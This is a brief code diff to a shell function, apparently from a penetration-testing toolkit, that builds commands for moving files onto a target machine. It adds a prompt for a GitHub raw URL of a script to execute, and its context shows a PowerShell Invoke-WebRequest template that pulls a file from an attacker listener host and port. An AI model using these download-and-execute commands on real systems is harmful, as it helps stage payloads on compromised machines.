@@ -99,7 +99,10 @@ nb-srv-file-download() {
     read choice
 
     # if choice == 7 - ask for ghrawurl variable
-
+    if [ "$choice" -eq 7 ]; then
+        echo -n "Enter the github RAW URL for the script to execute: "
+        read ghrawurl
+    fi
 
     case $choice in
         1) __COMMAND="Invoke-WebRequest http://${__LHOST}:${__LPORT}/$filename -OutFile $filename";;
